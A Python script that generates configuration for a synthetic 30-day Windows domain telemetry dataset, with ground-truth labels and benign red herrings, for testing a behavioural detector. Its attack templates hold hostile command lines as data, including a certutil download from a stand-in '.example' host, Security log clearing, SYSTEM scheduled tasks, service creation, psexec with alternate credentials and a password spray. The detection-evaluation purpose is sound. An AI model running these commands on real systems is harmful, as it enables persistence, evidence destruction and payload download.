#!/usr/bin/env python3
"""Build a 30-day Northside synthetic AD telemetry scenario configuration.

Requires: PyYAML (`python -m pip install pyyaml`)

This creates scenario inputs for the existing EvidenceForge/event-emitter workflow.
It does NOT itself emit Windows XML events or days30.jsonl; run it before the same
scenario-generation/export/conversion commands used for the 20-day experiment.
"""
from __future__ import annotations

import csv
import random
import re
from copy import deepcopy
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

import yaml

ROOT = Path(__file__).resolve().parent
BASE_ENV = ROOT / "environment_template_northside.yaml"
OUT_ENV = ROOT / "environment_northside.yaml"
OUT_STORY = ROOT / "storyline_30day.yaml"
OUT_SCENARIO = ROOT / "scenario_30day.yaml"
OUT_GT = ROOT / "GROUND_TRUTH30.md"
OUT_PLAN = ROOT / "attack_window_plan.csv"

SEED = 20261016
START_UTC = datetime(2026, 7, 28, 0, 0, tzinfo=timezone.utc)
DURATION_DAYS = 30
BASELINE_DAYS = 7

# Different synthetic North-India-style identities, mapped to the existing roles/hosts.
USER_MAP = {
    "ananya.sharma": {"username": "ishita.kapoor", "full_name": "Ishita Kapoor"},
    "rohan.mehta": {"username": "aarav.malhotra", "full_name": "Aarav Malhotra"},
    "arjun.iyer": {"username": "vivaan.sharma", "full_name": "Vivaan Sharma"},
    "kavya.reddy": {"username": "diya.singh", "full_name": "Diya Singh"},
    "rahul.verma": {"username": "kabir.chauhan", "full_name": "Kabir Chauhan"},
    "vikram.nair": {"username": "meera.bansal", "full_name": "Meera Bansal"},
    "priya.menon": {"username": "aditya.saxena", "full_name": "Aditya Saxena"},
    "sneha.patel": {"username": "prerna.verma", "full_name": "Prerna Verma"},
}
USERS = [v["username"] for v in USER_MAP.values()]
ORDINARY = USERS[:6]
ADMINS = ["aditya.saxena", "prerna.verma"]
USER_HOST = {
    "ishita.kapoor": "PC-001", "aarav.malhotra": "PC-002",
    "vivaan.sharma": "PC-003", "diya.singh": "PC-004",
    "kabir.chauhan": "PC-005", "meera.bansal": "PC-006",
    "aditya.saxena": "PC-007", "prerna.verma": "PC-008",
}
USER_IP = {
    "ishita.kapoor": "10.10.10.21", "aarav.malhotra": "10.10.10.22",
    "vivaan.sharma": "10.10.10.23", "diya.singh": "10.10.10.24",
    "kabir.chauhan": "10.10.10.25", "meera.bansal": "10.10.10.26",
    "aditya.saxena": "10.10.10.27", "prerna.verma": "10.10.10.28",
}

# Each template maps to specific Windows Security/Sysmon event families or numeric
# features in the current detector. One-off external logon and DNS-only beacon steps
# are deliberately omitted because the miss analysis showed weak scoring or missing attribution.
TEMPLATE_FEATURES = {
    "discovery": "Sysmon 1; discovery-tool process counts and process diversity",
    "share_collection": "Sysmon 1 robocopy; SMB port 445; transfer-tool and sensitive-port features",
    "explicit_credentials": "Security 4648; psexec remote-execution process; SMB port 445",
    "service_install": "sc.exe process; Security 4697 / System 7045 service-install feature",
    "scheduled_task": "schtasks process; Security 4698 scheduled-task feature",
    "account_group_change": "net.exe process; Security 4720 account creation and 4728/4732 group change",
    "log_clear": "wevtutil.exe process; Security 1102 / System 104 log-clear feature",
    "remote_thread": "Sysmon 1 temporary-path process plus Sysmon 8 remote-thread feature",
    "network_scan": "PowerShell process plus multiple Sysmon 3/5156 connections to sensitive ports",
    "transfer_external": "7z/certutil transfer-tool process plus external TCP/443 connection",
    "credential_spray": "Security 4625 failed-authentication burst from an external source address",
}

EXTERNAL_IP_BLOCKS = ("203.0.113", "198.51.100", "192.0.2")


def external_ip(i: int) -> str:
    block = EXTERNAL_IP_BLOCKS[i % len(EXTERNAL_IP_BLOCKS)]
    last = 10 + ((i * 17 + 13) % 230)
    return f"{block}.{last}"


def offset_text(day: int, hour: int, minute: int) -> str:
    # EvidenceForge relative-time style used by the existing scenario schema.
    return f"+{day}d{hour}h{minute}m"


def to_timestamp(day: int, hour: int, minute: int) -> datetime:
    return START_UTC + timedelta(days=day, hours=hour, minutes=minute)


def win10(ts: datetime) -> datetime:
    return ts.replace(minute=(ts.minute // 10) * 10, second=0, microsecond=0)


def deep_replace(obj: Any, mapping: dict[str, str]) -> Any:
    """Replace legacy username fragments in all values (case-insensitive)."""
    if isinstance(obj, dict):
        return {k: deep_replace(v, mapping) for k, v in obj.items()}
    if isinstance(obj, list):
        return [deep_replace(v, mapping) for v in obj]
    if isinstance(obj, str):
        out = obj
        for old, new in sorted(mapping.items(), key=lambda kv: len(kv[0]), reverse=True):
            out = re.sub(re.escape(old), new, out, flags=re.IGNORECASE)
        return out
    return obj


def build_environment() -> dict[str, Any]:
    if not BASE_ENV.exists():
        raise FileNotFoundError(f"Place environment_template_northside.yaml next to this script: {BASE_ENV}")
    envdoc = yaml.safe_load(BASE_ENV.read_text(encoding="utf-8"))
    env = envdoc["environment"]
    legacy_to_new = {old: data["username"] for old, data in USER_MAP.items()}

    env["description"] = (
        "Thirty-day synthetic Windows domain used for per-user behavioral baseline evaluation. "
        "The first seven complete scenario days are baseline-only; the following 23 days contain "
        "controlled attack episodes from event families represented in the detector's feature registry. "
        "Identities are fictional Northside-style names; no real endpoints or external systems are contacted."
    )
    for user in env.get("users", []):
        old = str(user.get("username", "")).lower()
        if old in USER_MAP:
            user["username"] = USER_MAP[old]["username"]
            user["full_name"] = USER_MAP[old]["full_name"]
            user["email"] = USER_MAP[old]["username"] + "@corp.local"
    for group in env.get("groups", []):
        group["members"] = [legacy_to_new.get(str(m).lower(), m) for m in group.get("members", [])]
    for system in env.get("systems", []):
        if system.get("assigned_user"):
            system["assigned_user"] = legacy_to_new.get(str(system["assigned_user"]).lower(), system["assigned_user"])
    for stale in env.get("stale_accounts", []):
        if str(stale.get("username", "")).lower() == "meera.joshi":
            stale["username"] = "pranav.joshi"
            stale["reason"] = "Former operations analyst; a retired scheduled task still presents a cached credential"
        if str(stale.get("username", "")).lower() == "svc-print-old":
            stale["username"] = "svc-print-legacy"

    # Assert no old primary identity remains in principal/group/system assignments.
    actual = {u.get("username") for u in env.get("users", [])}
    assert set(USERS).issubset(actual), f"new users missing from environment: {set(USERS)-actual}"
    assert not (set(USER_MAP) & actual), "legacy usernames still present in human principal list"
    return envdoc


def ev(kind: str, **kw: Any) -> dict[str, Any]:
    return {"type": kind, **kw}


def choose_actor(template: str, n: int, day: int) -> str:
    if template in {"service_install", "account_group_change", "log_clear"}:
        return ADMINS[(n + day) % len(ADMINS)]
    return USERS[(n * 3 + day) % len(USERS)]


def step_for(template: str, day: int, hour: int, minute: int, n: int) -> dict[str, Any]:
    actor = "SYSTEM" if template == "credential_spray" else choose_actor(template, n, day)
    system = USER_HOST.get(actor, "DC-01")
    source = USER_IP.get(actor, "10.10.10.23")
    ip = external_ip(n + day * 7)
    sid = f"{day:02d}{n:03d}"
    spacing = {"mode": "automated", "min_delay": "5s", "max_delay": "35s"}
    events: list[dict[str, Any]]
    activity: str

    if template == "discovery":
        activity = "Host and domain discovery through built-in Windows administration tools"
        events = [
            ev("process", technique="T1033 - System Owner/User Discovery", process_name=r"C:\Windows\System32\whoami.exe", command_line="whoami /all"),
            ev("process", technique="T1082 - System Information Discovery", process_name=r"C:\Windows\System32\systeminfo.exe", command_line="systeminfo"),
            ev("process", technique="T1087.002 - Account Discovery: Domain Account", process_name=r"C:\Windows\System32\net.exe", command_line='net group "Domain Admins" /domain'),
            ev("process", technique="T1018 - Remote System Discovery", process_name=r"C:\Windows\System32\nltest.exe", command_line="nltest /dclist:corp.local"),
        ]
    elif template == "share_collection":
        system = "FILE-01"
        activity = "Network-share enumeration and bulk file staging via a transfer utility"
        events = [
            ev("logon", technique="T1021.002 - Remote Services: SMB/Windows Admin Shares", description="Synthetic SMB network logon", logon_type=3, source_ip=source),
            ev("process", technique="T1083 - File and Directory Discovery", process_name=r"C:\Windows\System32\robocopy.exe", command_line=rf"robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_{sid} /E /R:1 /W:1"),
            ev("connection", technique="T1021.002 - SMB", dst_ip="10.10.20.20", dst_port=445, service="smb"),
        ]
    elif template == "explicit_credentials":
        activity = "Explicit use of a privileged account for remote administration"
        target = ADMINS[(n + 1) % len(ADMINS)]
        events = [
            ev("explicit_credentials", technique="T1078.002 - Valid Accounts: Domain Accounts", description="Synthetic explicit-credential use", target_username=target, target_server="FILE-01", process_name=r"C:\Windows\Temp\psexec.exe", source_ip=source),
            ev("process", technique="T1021.002 - Remote Services: SMB/Windows Admin Shares", process_name=r"C:\Windows\Temp\psexec.exe", command_line=rf"psexec.exe \\FILE-01 -u CORP\{target} cmd.exe"),
            ev("connection", technique="T1021.002 - SMB", dst_ip="10.10.20.20", dst_port=445, service="smb"),
        ]
    elif template == "service_install":
        system = "FILE-01"
        activity = "Creation of a new Windows service on a server"
        svc = f"NorthsideTelemetry{sid}"
        path = rf"C:\ProgramData\Ops\agent_{sid}.exe"
        events = [
            ev("process", technique="T1543.003 - Windows Service", process_name=r"C:\Windows\System32\sc.exe", command_line=rf"sc.exe create {svc} binPath= {path} start= auto"),
            ev("service_installed", technique="T1543.003 - Windows Service", service_name=svc, service_file_name=path, service_account="LocalSystem"),
        ]
    elif template == "scheduled_task":
        activity = "Scheduled task registered with a nonstandard executable path"
        task = rf"\Microsoft\Windows\Maintenance\HealthCheck{sid}"
        path = rf"C:\ProgramData\Cache\health_{sid}.exe"
        events = [
            ev("process", technique="T1053.005 - Scheduled Task/Job: Scheduled Task", process_name=r"C:\Windows\System32\schtasks.exe", command_line=rf'schtasks.exe /Create /TN "{task}" /TR "{path}" /SC HOURLY /RU SYSTEM'),
            ev("scheduled_task_created", technique="T1053.005 - Scheduled Task/Job: Scheduled Task", task_name=task),
        ]
    elif template == "account_group_change":
        system = "DC-01"
        activity = "Domain account creation followed by a group-membership change"
        newacct = f"svc-ns-maint-{sid}"
        events = [
            ev("process", technique="T1136.002 - Create Account: Domain Account", process_name=r"C:\Windows\System32\net.exe", command_line=rf"net user {newacct} /add /domain"),
            ev("account_created", technique="T1136.002 - Create Account: Domain Account", target_username=newacct),
            ev("group_member_added", technique="T1098 - Account Manipulation", group_name="Remote Desktop Users", member_name=newacct, scope="global"),
        ]
    elif template == "log_clear":
        system = "DC-01"
        activity = "Windows Security event log cleared after administrative command activity"
        events = [
            ev("process", technique="T1070.001 - Clear Windows Event Logs", process_name=r"C:\Windows\System32\wevtutil.exe", command_line="wevtutil cl Security"),
            ev("log_cleared", technique="T1070.001 - Clear Windows Event Logs"),
        ]
    elif template == "remote_thread":
        activity = "Unusual remote-thread activity targeting a sensitive Windows process"
        events = [
            ev("process", technique="T1055 - Process Injection", process_name=r"C:\Windows\Temp\diag-helper.exe", command_line="diag-helper.exe --inspect-session"),
            ev("create_remote_thread", technique="T1055 - Process Injection", description="Synthetic remote-thread event", target_process=r"C:\Windows\System32\lsass.exe"),
        ]
    elif template == "network_scan":
        activity = "Internal service discovery across common Windows infrastructure ports"
        events = [
            ev("process", technique="T1046 - Network Service Discovery", process_name=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", command_line='powershell.exe -NoProfile -Command "Test-NetConnection 10.10.20.20 -Port 445; Test-NetConnection 10.10.20.30 -Port 1433; Test-NetConnection 10.10.20.40 -Port 5985; Test-NetConnection 10.10.20.10 -Port 3389"'),
            ev("connection", technique="T1046 - Network Service Discovery", dst_ip="10.10.20.20", dst_port=445, service="smb"),
            ev("connection", technique="T1046 - Network Service Discovery", dst_ip="10.10.20.30", dst_port=1433, service="mssql"),
            ev("connection", technique="T1046 - Network Service Discovery", dst_ip="10.10.20.40", dst_port=5985, service="winrm"),
            ev("connection", technique="T1046 - Network Service Discovery", dst_ip="10.10.20.10", dst_port=3389, service="rdp"),
        ]
    elif template == "transfer_external":
        activity = "Archive/transfer utility activity followed by an external connection"
        external_host = f"upload-{sid}.example"
        events = [
            ev("process", technique="T1560.001 - Archive Collected Data", process_name=r"C:\Program Files\7-Zip\7z.exe", command_line=rf'7z.exe a C:\ProgramData\Cache\bundle_{sid}.7z C:\ProgramData\Cache\*.csv'),
            ev("process", technique="T1105 - Ingress Tool Transfer", process_name=r"C:\Windows\System32\certutil.exe", command_line=rf"certutil.exe -urlcache -split -f https://{external_host}/object C:\ProgramData\Cache\object_{sid}.bin"),
            ev("connection", technique="T1041 - Exfiltration Over C2 Channel", dst_ip=ip, dst_port=443, hostname=external_host, service="ssl", orig_bytes=800000, resp_bytes=2048),
        ]
    elif template == "credential_spray":
        system = "DC-01"
        activity = "Password-spray pattern against several domain accounts from an external source"
        targets = USERS[:]
        success_account = targets[(n + 2) % len(targets)]
        events = [ev("credential_spray", technique="T1110.003 - Password Spraying", description="Synthetic failed-authentication burst; reserved documentation IP used as source", source_ip=ip, pattern="spray", target_accounts=targets, logon_type=3, interval="10s", duration="2m", jitter=0.2, success={"account": success_account, "after": len(targets)})]
    else:
        raise ValueError(f"Unknown template: {template}")

    return {
        "id": f"atk30-d{day:02d}-s{n:03d}",
        "time": offset_text(day, hour, minute),
        "actor": actor,
        "system": system,
        "activity": activity,
        "event_spacing": spacing,
        "events": events,
        "_planned": {"day": day, "hour": hour, "minute": minute, "template": template, "signal": TEMPLATE_FEATURES[template]},
    }


def _random_daily_slots(rng: random.Random, count: int) -> list[tuple[int, int]]:
    """Choose well-separated 10-minute windows so attacks are not clockwork-periodic."""
    candidates = [(h, m) for h in range(1, 23) for m in range(0, 60, 10)]
    rng.shuffle(candidates)
    selected: list[tuple[int, int]] = []
    for h, m in candidates:
        t = h * 60 + m
        if all(abs(t - (sh * 60 + sm)) >= 120 for sh, sm in selected):
            selected.append((h, m))
            if len(selected) == count:
                break
    if len(selected) != count:
        raise RuntimeError(f"could not find {count} separated slots")
    return sorted(selected)


def build_storyline() -> tuple[dict[str, Any], list[dict[str, Any]]]:
    steps: list[dict[str, Any]] = []
    templates = [
        "discovery", "share_collection", "explicit_credentials", "service_install",
        "scheduled_task", "account_group_change", "log_clear", "remote_thread",
        "network_scan", "transfer_external",
    ]
    rng = random.Random(SEED)
    n = 0
    for day in range(BASELINE_DAYS, DURATION_DAYS):
        # Keep the planned episode count stable (3/day plus a fourth on even offsets),
        # but randomise clock slots and attack families deterministically by generation seed.
        slot_count = 4 if day % 2 == 0 else 3
        slots = _random_daily_slots(rng, slot_count)
        for slot, (hour, minute) in enumerate(slots):
            # Three deliberate spray episodes; all use a dedicated reserved source IP
            # recoverable by the evaluator from the ground-truth IOC section.
            is_spray = day in {12, 19, 26} and slot == 1
            template = "credential_spray" if is_spray else rng.choice(templates)
            st = step_for(template, day, hour, minute, n)
            steps.append(st)
            n += 1

    # Remove private planner metadata from YAML story; retain it for GT/CSV outputs.
    plan = []
    for s in steps:
        p = s.pop("_planned")
        ts = to_timestamp(p["day"], p["hour"], p["minute"])
        plan.append({
            "step_id": s["id"], "scenario_day_offset": p["day"],
            "scheduled_time_utc": ts.isoformat().replace("+00:00", "Z"),
            "window_start_utc": win10(ts).isoformat().replace("+00:00", "Z"),
            "actor": s["actor"], "system": s["system"], "activity": s["activity"],
            "template": p["template"], "model_observable_evidence": p["signal"],
            "event_types": ";".join(e["type"] for e in s["events"]),
            "split": "test/attack",
        })
    return {"storyline": steps}, plan


def build_red_herrings() -> list[dict[str, Any]]:
    # Benign counterexamples occur only within the 30-day window. They are not attack labels.
    return [
        {"id": "rh30-01", "time": "+10d5h00m", "actor": "prerna.verma", "system": "PC-008",
         "activity": "Scheduled security audit performs normal domain inventory",
         "explanation": "Approved audit by the security analyst; discovery utilities can be legitimate.",
         "events": [ev("process", process_name=r"C:\Windows\System32\net.exe", command_line='net group "Domain Admins" /domain'), ev("process", process_name=r"C:\Windows\System32\nltest.exe", command_line="nltest /domain_trusts")]},
        {"id": "rh30-02", "time": "+15d7h15m", "actor": "kabir.chauhan", "system": "PC-001",
         "activity": "Help-desk remote session to a finance workstation",
         "explanation": "Approved troubleshooting; a remote-session signal alone is not attack ground truth.",
         "events": [ev("rdp_session", source_ip="10.10.10.25")]},
        {"id": "rh30-03", "time": "+22d12h00m", "actor": "aditya.saxena", "system": "FILE-01",
         "activity": "Approved monthly server patching",
         "explanation": "Authorized maintenance; process activity is not service creation or persistence.",
         "events": [ev("rdp_session", source_ip="10.10.10.27"), ev("process", process_name=r"C:\Windows\System32\wusa.exe", command_line=r"wusa.exe C:\Patches\monthly-rollup.msu /quiet /norestart")]},
        {"id": "rh30-04", "time": "+27d4h20m", "actor": "ishita.kapoor", "system": "PC-001",
         "activity": "Routine PowerShell inventory of running processes",
         "explanation": "Normal local inventory without a linked external connection or persistence signal.",
         "events": [ev("process", process_name=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", command_line='powershell.exe -NoProfile -Command "Get-Process"')]},
    ]


def main() -> None:
    envdoc = build_environment()
    envdoc = deep_replace(envdoc, {old: v["username"] for old, v in USER_MAP.items()})
    # Ensure full names/emails after generalized replacements.
    for u in envdoc["environment"].get("users", []):
        for old, data in USER_MAP.items():
            if u.get("username") == data["username"]:
                u["full_name"] = data["full_name"]
                u["email"] = data["username"] + "@corp.local"

    storyline, plan = build_storyline()
    red_herrings = build_red_herrings()

    scenario = {
        "includes": ["environment_northside.yaml", "storyline_30day.yaml"],
        "version": "1.0",
        "generation_seed": SEED,
        "name": "northside-ad-behavioral-baseline-30day",
        "description": (
            "Thirty-day synthetic Windows-only dataset for per-user behavioral baseline detection. "
            "Days 1-7 are baseline-only; days 8-30 contain feature-supported attack episodes. "
            "Evaluation unit: one principal x non-overlapping 10-minute UTC window."
        ),
        "time_window": {"start": START_UTC.isoformat().replace("+00:00", "Z"), "duration": "30d", "warmup": "8h"},
        "baseline_activity": {
            "description": "Generic single-site Windows office activity with role-specific logons, applications, file-share access, routine processes and internal connections. No injected attack storyline steps during the first seven scenario days.",
            "intensity": "medium", "variation": "medium", "suspicious_noise": "low",
            "traffic_rates": {"user_activity": "medium", "persona_connections": "medium", "web": "low"},
        },
        "logon_grace_period": "30m",
        "observation_profile": "complete",
        "red_herrings": red_herrings,
        "output": {"logs": [{"format": "windows_event_security"}, {"format": "windows_event_sysmon"}],
                   "destination": "scenarios/northside-30day/output", "compression": False},
    }

    OUT_ENV.write_text(yaml.safe_dump(envdoc, sort_keys=False, allow_unicode=True, width=110), encoding="utf-8")
    OUT_STORY.write_text(yaml.safe_dump(storyline, sort_keys=False, allow_unicode=True, width=110), encoding="utf-8")
    OUT_SCENARIO.write_text(yaml.safe_dump(scenario, sort_keys=False, allow_unicode=True, width=110), encoding="utf-8")

    with OUT_PLAN.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=list(plan[0].keys()))
        writer.writeheader(); writer.writerows(plan)

    # Notebook ground-truth markdown: planned times are aligned to within a 10-minute window.
    # Reconcile this plan with actual emitted logs before final publication/evaluation.
    lines = [
        "# Ground Truth: Northside AD Behavioral Baseline — 30 days", "",
        "**Scenario:** 30-day synthetic Windows Security/Sysmon corpus. First seven scenario days are baseline-only; following 23 days contain planned attack episodes.",
        f"**Scenario start:** {START_UTC.strftime('%Y-%m-%d %H:%M:%S UTC')}",
        f"**Baseline end / test start:** {(START_UTC + timedelta(days=BASELINE_DAYS)).strftime('%Y-%m-%d %H:%M:%S UTC')}",
        f"**Scenario end (exclusive):** {(START_UTC + timedelta(days=DURATION_DAYS)).strftime('%Y-%m-%d %H:%M:%S UTC')}",
        f"**Planned attack episodes:** {len(plan)}. The final count of positive user-window labels must be recalculated from emitted and attributed events; credential-spray fan-out may produce additional user windows.",
        "**Identity note:** All human principals are fictional names. External IPs/domains use documentation-only address/domain ranges and must not be used as real destinations.",
        "", "## Attack Summary", "",
    ]
    for i, p in enumerate(plan, start=1):
        lines.append(f"{i}. **{p['actor']}** on **{p['system']}**: {p['activity']} (observable evidence: {p['model_observable_evidence']})")
    lines += ["", "## Timeline", "", "| Timestamp | Actor | System | Event Type | Details |", "|-----------|-------|--------|------------|---------|"]
    type_name = {
        "process": "Process", "logon": "Logon", "connection": "Connection",
        "credential_spray": "Credential_Spray", "dns_query": "Dns_Query",
        "explicit_credentials": "Explicit_Credentials", "account_created": "Account_Created",
        "group_member_added": "Group_Member_Added", "service_installed": "Service_Installed",
        "scheduled_task_created": "Scheduled_Task_Created", "log_cleared": "Log_Cleared",
        "create_remote_thread": "Create_Remote_Thread", "rdp_session": "Rdp_Session",
    }
    step_lookup = {s["id"]: s for s in storyline["storyline"]}
    for p in plan:
        ts = datetime.fromisoformat(p["scheduled_time_utc"].replace("Z", "+00:00"))
        step = step_lookup[p["step_id"]]
        etype = type_name.get(step["events"][0]["type"], step["events"][0]["type"].title())
        lines.append(f"| {ts.strftime('%Y-%m-%d %H:%M:%S UTC')} | {p['actor']} | {p['system']} | {etype} | {p['activity']} |")
    # The notebook's label builder uses only these spray source IPs to recover
    # per-user 4625 windows; keep other external endpoints out of this evaluation list.
    spray_ips = sorted({
        str(e.get("source_ip"))
        for s in storyline["storyline"]
        for e in s.get("events", [])
        if e.get("type") == "credential_spray" and e.get("source_ip")
    })
    lines += ["", "## Indicators of Compromise", "",
              "Evaluation-only synthetic sources for recovering password-spray victim windows. "
              "These values are not detection rules and use reserved documentation IP ranges.", ""]
    for ip in spray_ips:
        lines.append(f"- `{ip}` (synthetic password-spray source; evaluation only)")
    lines += ["", "## Red Herrings", "", "Benign look-alike activities emitted separately from attack ground truth.", "",
              "| Timestamp | Actor | System | Activity | Why It's Benign |", "|-----------|-------|--------|----------|-----------------|"]
    for rh in red_herrings:
        match = re.fullmatch(r"\+(\d+)d(\d+)h(\d+)m", rh["time"])
        assert match, f"unsupported relative time: {rh['time']}"
        d, h, m = map(int, match.groups())
        ts = to_timestamp(d, h, m)
        lines.append(f"| {ts.strftime('%Y-%m-%d %H:%M:%S UTC')} | {rh['actor']} | {rh['system']} | {rh['activity']} | {rh['explanation']} |")
    lines += ["", "## Evaluation Notes", "",
              "- These are planned ground-truth windows, not proof of what the emitter ultimately produced. Verify each labeled user/window has matching emitted telemetry and correct attribution.",
              "- Train dates are July 28-August 3, 2026 inclusive; test dates are August 4-August 26, 2026 inclusive, all in UTC.",
              "- Keep the scoring threshold selected using baseline/validation data only. Do not choose features or threshold by maximizing metrics on the final attack/test labels.",
              "- Attack templates were limited to feature families represented in the current notebook. Single remote-logon-only and DNS-beacon-only episodes were excluded because the supplied miss analysis showed weak scores or missing attribution for those patterns.",
              "- Feature-supported means the event family has a feature path; it does not guarantee the risk will exceed the threshold. Reconcile emitted and attributed events, then report recall from the actual scoring output.", ""]
    OUT_GT.write_text("\n".join(lines), encoding="utf-8")

    # Basic validation before handing files over.
    assert len(plan) == 80, f"expected 80 planned attack episodes, got {len(plan)}"
    offsets = [p["scenario_day_offset"] for p in plan]
    assert min(offsets) == 7 and max(offsets) == 29
    supported = set(TEMPLATE_FEATURES)
    assert all(p["template"] in supported for p in plan)
    assert all(p["actor"] == "SYSTEM" or p["actor"] in USERS for p in plan)
    print("Generated 30-day scenario configuration package:")
    for p in [OUT_ENV, OUT_STORY, OUT_SCENARIO, OUT_GT, OUT_PLAN]:
        print(f"  {p.name}: {p.stat().st_size:,} bytes")
    print(f"  principals: {', '.join(USERS)}")
    print(f"  planned attack episodes: {len(plan)} (7 baseline days + 23 attack/test days)")
    print("  detectable event families: " + ", ".join(sorted(supported)))
    print("  NOTE: EvidenceForge/log-emitter must still produce the actual Windows logs.")

if __name__ == "__main__":
    main()
